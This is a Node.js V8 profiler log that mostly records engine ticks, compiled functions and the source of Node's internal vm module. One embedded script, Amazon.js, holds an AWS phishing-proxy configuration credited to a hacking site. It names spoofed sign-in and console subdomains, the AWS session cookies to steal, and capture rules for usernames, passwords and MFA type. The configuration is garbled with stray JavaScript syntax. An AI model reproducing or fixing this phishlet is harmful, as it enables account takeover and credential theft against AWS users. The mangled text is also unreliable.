v8-version,11,3,244,8,-node.17,0
v8-platform,macos,macos
shared-library,/usr/local/bin/node,0x11324d000,0x114b4486a,160587776
code-source-info,0xaa67f4f462e,24,15940,16072,C0O15955C6O16003C12O16010C20O16028C23O16028C28O16056C29O16070,,
tick,0x109ef2492,107437,0,0x0,3,0x10a1fe9d0,0xaa67f4e9854,0xaa67f4e781e,0xaa67f4f4138,0xaa67f4f3cd2,0xaa67f4f2e4e,0xaa67f4ef6ab,0xaa67f4dec45,0xaa65a03b30f
tick,0x7ff80930352b,107466,0,0x0,3,0x10a1fe9d0,0xaa67f4e9854,0xaa67f4e781e,0xaa67f4f4138,0xaa67f4f3cd2,0xaa67f4f2e4e,0xaa67f4ef6ab,0xaa67f4dec45,0xaa65a03b30f
code-creation,JS,10,107478,0xaa67f4f7376,30,normalizeEncoding node:internal/util:212:27,0xaa602bc2508,~
code-source-info,0xaa67f4f7376,16,5641,5746,C0O5651C7O5674C14O5692C19O5705C21O5719C22O5722C25O5729C29O5744,,
code-creation,JS,10,107516,0xaa67f4f745e,9,isInt32 node:internal/validators:43:17,0xaa65957eea8,~
code-source-info,0xaa67f4f745e,15,851,894,C0O863C2O887C5O876C8O892,,
code-creation,JS,10,107579,0xaa67f4f754e,42, node:internal/fs/utils:727:42,0xaa602bf3c28,~
code-source-info,0xaa67f4f754e,60,19896,20054,C14O19951C19O19951C24O19985C29O19985C34O20017C37O20024C41O20052,,
code-creation,JS,10,107624,0xaa67f4f768e,106,possiblyTransformPath node:internal/fs/utils:715:31,0xaa602bf3bd8,~
code-source-info,0xaa67f4f768e,60,19572,19853,C0O19583C5O19598C10O19598C16O19617C22O19655C27O19662C31O19680C32O19691C39O19698C42O19698C47O19691C51O19723C56O19728C62O19750C67O19757C73O19779C80O19797C85O19809C88O19809C93O19797C98O19786C102O19832C103O19839C105O19851,,
code-creation,JS,10,107697,0xaa67f4f7ace,515,stringToFlags node:internal/fs/utils:584:23,0xaa602bf39f8,~
code-source-info,0xaa67f4f7ace,60,15805,17039,C14O15833C20O15870C25O15870C30O15902C32O15915C33O15923C38O15948C42O15964C43O15972C202O16004C206O16020C207O16070C214O16088C216O16086C219O16095C220O16112C224O16126C225O16178C232O16194C234O16192C237O16201C238O16218C245O16235C247O16233C253O16245C255O16243C258O16254C259O16304C266O16321C268O16319C274O16331C276O16329C282O16342C284O16340C287O16349C288O16367C295O16384C297O16382C303O16394C305O16392C308O16401C309O16451C316O16468C318O16466C324O16478C326O16476C332O16487C334O16485C337O16494C338O16511C345O16529C347O16527C353O16539C355O16537C358O16548C359O16598C366O16616C368O16614C374O16626C376O16624C382O16637C384O16635C387O16644C388O16694C395O16712C397O16710C403O16722C405O16720C411O16733C413O16731C416O16740C417O16758C424O16776C426O16774C432O16786C434O16784C437O16793C438O16843C445O16861C447O16859C453O16871C455O16869C461O16880C463O16878C466O16887C467O16937C474O16955C476O16953C482O16965C484O16963C490O16974C492O16972C495O16981C496O16989C509O16995C514O16989,,
tick,0x7ff8092c91fe,108716,1,0x109a204b0,6,0x109c2c000,0xaa67f4f4196,0xaa67f4f3cd2,0xaa67f4f2e4e,0xaa67f4ef6ab,0xaa67f4dec45,0xaa65a03b30f
code-creation,JS,10,108851,0xaa67f4f8096,463,Module._compile node:internal/modules/cjs/loader:1330:37,0xaa602bf7350,~
code-source-info,0xaa67f4f8096,63,42944,44762,C0O42972C2O42989C4O43019C9O43019C15O43027C23O43041C25O43061C30O43073C35O43123C40O43123C46O43168C51O43168C57O43236C69O43236C75O43297C77O43305C85O43309C94O43352C101O43373C107O43467C110O43479C117O43483C125O43514C128O43536C136O43561C143O43565C152O43536C160O43527C170O43758C177O43765C182O43778C188O43778C193O43765C198O43758C204O43842C209O43855C215O43922C223O43943C229O43974C231O43970C236O43996C240O44011C246O44025C252O44044C257O44072C262O44122C267O44127C272O44127C278O44164C283O44164C289O44208C291O44239C296O44268C297O44294C300O44302C306O44319C311O44328C316O44340C324O44338C330O44359C334O44387C355O44396C363O44532C368O44571C377O44609C386O44618C395O44627C404O44635C413O44645C423O44541C429O44662C433O44688C439O44698C445O44715C450O44724C454O44734C460O44746C462O44760,,
code-creation,JS,10,108971,0xaa67f4f8786,364,wrapSafe node:internal/modules/cjs/loader:1257:18,0xaa602bf72d0,~
code-source-info,0xaa67f4f8786,63,40039,42615,C0O40039C14O40121C26O40135C31O40121C36O40405C44O40440C49O40447C54O40447C60O40481C89O40481C95O41013C101O41035C115O41105C126O41035C131O41131C145O41138C150O41182C151O41205C159O41295C196O41295C202O42014C206O42046C224O42086C229O42108C234O42109C240O42126C245O42134C253O42134C258O42253C264O42275C278O42345C289O42275C294O42385C298O42394C310O42417C315O42429C322O42440C327O42498C335O42498C340O42479C345O42549C356O42549C361O42599C363O42599,,
code-creation,JS,10,109071,0xaa67f4f8b5e,118,internalCompileFunction node:internal/vm:73:33,0xaa602bdbdb8,~
script-source,36,node:internal/vm,'use strict';\n\nconst {\n  ReflectApply\x2C\n  Symbol\x2C\n} = primordials;\n\nconst {\n  ContextifyScript\x2C\n  compileFunction\x2C\n  isContext: _isContext\x2C\n} = internalBinding('contextify');\nconst {\n  runInContext\x2C\n} = ContextifyScript.prototype;\nconst {\n  default_host_defined_options\x2C\n  vm_dynamic_import_missing_flag\x2C\n} = internalBinding('symbols');\nconst {\n  validateFunction\x2C\n  validateObject\x2C\n  kValidateObjectAllowArray\x2C\n} = require('internal/validators');\n\nconst {\n  getOptionValue\x2C\n} = require('internal/options');\n\n\nfunction isContext(object) {\n  validateObject(object\x2C 'object'\x2C kValidateObjectAllowArray);\n\n  return _isContext(object);\n}\n\nfunction getHostDefinedOptionId(importModuleDynamically\x2C hint) {\n  if (importModuleDynamically !== undefined) {\n    // Check that it's either undefined or a function before we pass\n    // it into the native constructor.\n    validateFunction(importModuleDynamically\x2C\n                     'options.importModuleDynamically');\n  }\n  if (importModuleDynamically === undefined) {\n    // We need a default host defined options that are the same for all\n    // scripts not needing custom module callbacks so that the isolate\n    // compilation cache can be hit.\n    return default_host_defined_options;\n  }\n  // We should've thrown here immediately when we introduced\n  // --experimental-vm-modules and importModuleDynamically\x2C but since\n  // users are already using this callback to throw a similar error\x2C\n  // we also defer the error to the time when an actual import() is called\n  // to avoid breaking them. To ensure that the isolate compilation\n  // cache can still be hit\x2C use a constant sentinel symbol here.\n  if (!getOptionValue('--experimental-vm-modules')) {\n    return vm_dynamic_import_missing_flag;\n  }\n\n  return Symbol(hint);\n}\n\nfunction registerImportModuleDynamically(referrer\x2C importModuleDynamically) {\n  const { importModuleDynamicallyWrap } = require('internal/vm/module');\n  const { registerModule } = require('internal/modules/esm/utils');\n  registerModule(referrer\x2C {\n    __proto__: null\x2C\n    importModuleDynamically:\n      importModuleDynamicallyWrap(importModuleDynamically)\x2C\n  });\n}\n\nfunction internalCompileFunction(\n  code\x2C filename\x2C lineOffset\x2C columnOffset\x2C\n  cachedData\x2C produceCachedData\x2C parsingContext\x2C contextExtensions\x2C\n  params\x2C hostDefinedOptionId\x2C importModuleDynamically) {\n  const result = compileFunction(\n    code\x2C\n    filename\x2C\n    lineOffset\x2C\n    columnOffset\x2C\n    cachedData\x2C\n    produceCachedData\x2C\n    parsingContext\x2C\n    contextExtensions\x2C\n    params\x2C\n    hostDefinedOptionId\x2C\n  );\n\n  if (produceCachedData) {\n    result.function.cachedDataProduced = result.cachedDataProduced;\n  }\n\n  if (result.cachedData) {\n    result.function.cachedData = result.cachedData;\n  }\n\n  if (typeof result.cachedDataRejected === 'boolean') {\n    result.function.cachedDataRejected = result.cachedDataRejected;\n  }\n\n  if (importModuleDynamically !== undefined) {\n    registerImportModuleDynamically(result.function\x2C importModuleDynamically);\n  }\n\n  return result;\n}\n\nfunction makeContextifyScript(code\x2C\n                              filename\x2C\n                              lineOffset\x2C\n                              columnOffset\x2C\n                              cachedData\x2C\n                              produceCachedData\x2C\n                              parsingContext\x2C\n                              hostDefinedOptionId\x2C\n                              importModuleDynamically) {\n  let script;\n  // Calling `ReThrow()` on a native TryCatch does not generate a new\n  // abort-on-uncaught-exception check. A dummy try/catch in JS land\n  // protects against that.\n  try { // eslint-disable-line no-useless-catch\n    script = new ContextifyScript(code\x2C\n                                  filename\x2C\n                                  lineOffset\x2C\n                                  columnOffset\x2C\n                                  cachedData\x2C\n                                  produceCachedData\x2C\n                                  parsingContext\x2C\n                                  hostDefinedOptionId);\n  } catch (e) {\n    throw e; /* node-do-not-add-exception-line */\n  }\n\n  if (importModuleDynamically !== undefined) {\n    registerImportModuleDynamically(script\x2C importModuleDynamically);\n  }\n  return script;\n}\n\n// Internal version of vm.Script.prototype.runInThisContext() which skips\n// argument validation.\nfunction runScriptInThisContext(script\x2C displayErrors\x2C breakOnFirstLine) {\n  return ReflectApply(\n    runInContext\x2C\n    script\x2C\n    [\n      null\x2C                // sandbox - use current context\n      -1\x2C                  // timeout\n      displayErrors\x2C       // displayErrors\n      false\x2C               // breakOnSigint\n      breakOnFirstLine\x2C    // breakOnFirstLine\n    ]\x2C\n  );\n}\n\nmodule.exports = {\n  getHostDefinedOptionId\x2C\n  internalCompileFunction\x2C\n  isContext\x2C\n  makeContextifyScript\x2C\n  registerImportModuleDynamically\x2C\n  runScriptInThisContext\x2C\n};\n
code-source-info,0xaa67f4f8b5e,36,2169,3020,C0O2358C35O2358C41O2560C45O2596C50O2633C54O2624C58O2671C64O2696C69O2725C73O2716C77O2762C85O2809C90O2846C94O2837C98O2873C102O2922C105O2961C110O2922C115O3004C117O3018,,
tick,0x1099739fc,109411,0,0x0,3,0x10a1fe9d0,0xaa67f4f884a,0xaa67f4f80db,0xaa67f4f3e7c,0xaa67f4f2e4e,0xaa67f4ef6ab,0xaa67f4dec45,0xaa65a03b30f
code-creation,Eval,10,109541,0xaa67f4f9f5e,5, /Applications/MAMP/htdocs/amazon.html/Amazon.js:1:1,0xaa67f4f9e18,~
script-source,81,/Applications/MAMP/htdocs/amazon.html/Amazon.js,// noinspection JSUnusedAssignment\x2CBadExpressionStatementJS\x2CJSAnnotator\n\nname:\n    'amazonElement';\nlet amazonElement;\n(amazonElement)\namazonElement\nlet domain1 = 'domain'; {\n\n} `Amazon`\nauthor: 'www.simplerhacking.com'\nmin_ver: '3.0.0'\nparams:\n  - {name: 'accountid'\x2C default: ''\x2C required: false}\n\nproxy_hosts:\n  - {phish_sub: 'signin.aws'\x2C orig_sub: 'signin.aws'\x2C domain: 'amazon.com'\x2C session: true\x2C is_landing: true\x2C auto_filter: true}\n  - {phish_sub: 'aws'\x2C orig_sub: 'aws'\x2C domain: 'amazon.com'\x2C session: true\x2C is_landing: false\x2C auto_filter: true}\n  - {phish_sub: ''\x2C orig_sub: ''\x2C domain: 'amazon.com'\x2C session: true\x2C is_landing: false\x2C auto_filter: true}\n  - {phish_sub: 'phd.aws'\x2C orig_sub: 'phd.aws'\x2C domain: 'amazon.com'\x2C session: true\x2C is_landing: false\x2C auto_filter: true}\n  - {phish_sub: 'console.aws'\x2C orig_sub: 'console.aws'\x2C domain: 'amazon.com'\x2C session: true\x2C is_landing: false\x2C auto_filter: true}\n  - {phish_sub: 'a.b.cdn.console'\x2C orig_sub: 'a.b.cdn.console'\x2C domain: 'awsstatic.com'\x2C session: true\x2C is_landing: false\x2C auto_filter: true}\n  - {phish_sub: 'us-east-1.console.aws'\x2C orig_sub: 'us-east-1.console.aws'\x2C domain: 'amazon.com'\x2C session: false\x2C is_landing: false\x2C auto_filter: true}\n  - {phish_sub: 'us-east-2.console.aws'\x2C orig_sub: 'us-east-2.console.aws'\x2C domain: 'amazon.com'\x2C session: false\x2C is_landing: false\x2C auto_filter: true}  \n  - {phish_sub: 'us-west-1.console.aws'\x2C orig_sub: 'us-west-1.console.aws'\x2C domain: 'amazon.com'\x2C session: false\x2C is_landing: false\x2C auto_filter: true}  \n  - {phish_sub: 'us-west-2.console.aws'\x2C orig_sub: 'us-west-2.console.aws'\x2C domain: 'amazon.com'\x2C session: false\x2C is_landing: false\x2C auto_filter: true}\n  - {phish_sub: 'af-south-1.console.aws'\x2C orig_sub: 'af-south-1.console.aws'\x2C domain: 'amazon.com'\x2C session: false\x2C is_landing: false\x2C auto_filter: true}\n  - {phish_sub: 'ap-east-1.console.aws'\x2C orig_sub: 'ap-east-1.console.aws'\x2C domain: 'amazon.com'\x2C session: false\x2C is_landing: false\x2C auto_filter: true}\n  - {phish_sub: 'ap-south-1.console.aws'\x2C orig_sub: 'ap-south-1.console.aws'\x2C domain: 'amazon.com'\x2C session: false\x2C is_landing: false\x2C auto_filter: true}\n  - {phish_sub: 'ap-northeast-3.console.aws'\x2C orig_sub: 'ap-northeast-3.console.aws'\x2C domain: 'amazon.com'\x2C session: false\x2C is_landing: false\x2C auto_filter: true}\n  - {phish_sub: 'ap-northeast-2.console.aws'\x2C orig_sub: 'ap-northeast-2.console.aws'\x2C domain: 'amazon.com'\x2C session: false\x2C is_landing: false\x2C auto_filter: true}\n  - {phish_sub: 'ap-southeast-1.console.aws'\x2C orig_sub: 'ap-southeast-1.console.aws'\x2C domain: 'amazon.com'\x2C session: false\x2C is_landing: false\x2C auto_filter: true}\n  - {phish_sub: 'ap-southeast-2.console.aws'\x2C orig_sub: 'ap-southeast-2.console.aws'\x2C domain: 'amazon.com'\x2C session: false\x2C is_landing: false\x2C auto_filter: true}\n  - {phish_sub: 'ap-northeast-1.console.aws'\x2C orig_sub: 'ap-northeast-1.console.aws'\x2C domain: 'amazon.com'\x2C session: false\x2C is_landing: false\x2C auto_filter: true}\n  - {phish_sub: 'ca-central-1.console.aws'\x2C orig_sub: 'ca-central-1.console.aws'\x2C domain: 'amazon.com'\x2C session: false\x2C is_landing: false\x2C auto_filter: true}\n  - {phish_sub: 'eu-central-1.console.aws'\x2C orig_sub: 'eu-central-1.console.aws'\x2C domain: 'amazon.com'\x2C session: false\x2C is_landing: false\x2C auto_filter: true}\n  - {phish_sub: 'eu-west-1.console.aws'\x2C orig_sub: 'eu-west-1.console.aws'\x2C domain: 'amazon.com'\x2C session: false\x2C is_landing: false\x2C auto_filter: true}\n  - {phish_sub: 'eu-west-2.console.aws'\x2C orig_sub: 'eu-west-2.console.aws'\x2C domain: 'amazon.com'\x2C session: false\x2C is_landing: false\x2C auto_filter: true}\n  - {phish_sub: 'eu-south-1.console.aws'\x2C orig_sub: 'eu-south-1.console.aws'\x2C domain: 'amazon.com'\x2C session: false\x2C is_landing: false\x2C auto_filter: true}\n  - {phish_sub: 'eu-west-3.console.aws'\x2C orig_sub: 'eu-west-3.console.aws'\x2C domain: 'amazon.com'\x2C session: false\x2C is_landing: false\x2C auto_filter: true}\n  - {phish_sub: 'eu-north-1.console.aws'\x2C orig_sub: 'eu-north-1.console.aws'\x2C domain: 'amazon.com'\x2C session: false\x2C is_landing: false\x2C auto_filter: true}\n  - {phish_sub: 'me-south-1.console.aws'\x2C orig_sub: 'me-south-1.console.aws'\x2C domain: 'amazon.com'\x2C session: false\x2C is_landing: false\x2C auto_filter: true}\n  - {phish_sub: 'sa-east-1.console.aws'\x2C orig_sub: 'sa-east-1.console.aws'\x2C domain: 'amazon.com'\x2C session: false\x2C is_landing: false\x2C auto_filter: true}\n\nlet domain;\nlet number = - domain1; '.amazon.com'\nlet number1 = {\n    keys: ['aws-ubid-main'\x2C 'aws-signer-token_ap-southeast-2'\x2C 'noflush_awsccs_sid'\x2C 'aws-userInfo'\x2C 'aws-userInfo-signed'\x2C 'aws-account-alias'\x2C '.*\x2Cregexp']\n};\n\n- domain1; '.aws.amazon.com'\n    keys: number2 = ['awsccc'\x2C 'aws-vid'\x2C 'aws-account-data'\x2C '.*\x2Cregexp']\n  - domain1; '.console.aws.amazon.com'\n    keys: number3 = ['noflush_Region'\x2C 'noflush_awscnm'\x2C 'awsc-rac'\x2C 'aws-creds'\x2C 'aws-consoleInfo'\x2C 'aws-creds-code-verifier'\x2C 'seance'\x2C '.*\x2Cregexp']\n  - domain1; '.signin.aws.amazon.com'\n    keys: number4 = ['aws-creds'\x2C 'aws-userInfo-keyBase'\x2C 'aws-mfa-entered'\x2C 'JSESSIONID'\x2C 'aws-signin-csrf'\x2C '.*\x2Cregexp']\n  - domain1; 'phd.aws.amazon.com'\n    keys: ['aws-creds'\x2C 'aws-creds-code-verifier'\x2C 'aws-consoleInfo'\x2C 'seance'\x2C '.*\x2Cregexp']\n\ncredentials:\n  username:\n    key: 'username'\n    search: '(.*)'\n    type: 'post'\n  password:\n    key: 'password'\n    search: '(.*)'\n    type: 'post'\n  custom: 'key';\nlet key;\nlet number6 = - key; 'account'\n      search: '(.*)'\n      type: number5 = 'post'\n    - key; 'mfaType'\n      search: '(.*)'\n      type: 'post'\n\nauth_urls:\n  - '/console/home'\n\nlogin:\n  domain: 'signin.aws.amazon.com'\n  path: '/oauth?redirect_uri=https://console.aws.amazon.com/console/home?hashArgs=%23&isauthcode=true&client_id=arn:aws:signin:::console/canvas&response_type=code&iam_user=true{accountid}&forceMobileApp=0&code_challenge=hzU4QD5OTEZeurPpybAoADh8GnO_URqBECTzHN4CxkY&code_challenge=&code_challenge_method=SHA-256'\n
code-source-info,0xaa67f4f9f5e,81,0,5843,C0O0C4O5843,,
code-creation,JS,10,109881,0xaa67f4fafe6,306, /Applications/MAMP/htdocs/amazon.html/Amazon.js:1:1,0xaa67f4f9ed8,~
code-source-info,0xaa67f4fafe6,81,0,5843,C0O104C2O163C5O247C9O247C11O315C15O315C22O443C30O558C38O667C46O790C54O921C62O1063C70O1215C78O1369C86O1523C94O1675C102O1829C110O1981C118O2135C126O2297C134O2459C142O2621C150O2783C158O2945C166O3103C174O3261C182O3413C190O3565C198O3719C206O3871C214O4025C222O4179C225O4334C227O4355C229O4355C232O4394C237O4558C239O4558C241O4597C248O4664C251O4605C254O4711C261O4854C264O4719C267O4900C274O5015C277O4908C280O5057C284O5311C286O5330C289O5380C294O5401C297O5388C300O5472C302O5472C304O5540C305O5842,,
code-creation,JS,10,109963,0xaa67f4fb6be,52,registerImportModuleDynamically node:internal/vm:63:41,0xaa602bdbd68,~
code-source-info,0xaa67f4fb6be,36,1810,2135,C0O1890C6O1890C11O1858C16O1950C22O1950C27O1931C32O2006C37O2074C45O1991C51O2134,,
code-creation,JS,10,110059,0xaa67f4fb88e,19,importModuleDynamicallyWrap node:internal/vm/module:429:37,0xaa602bfae60,~
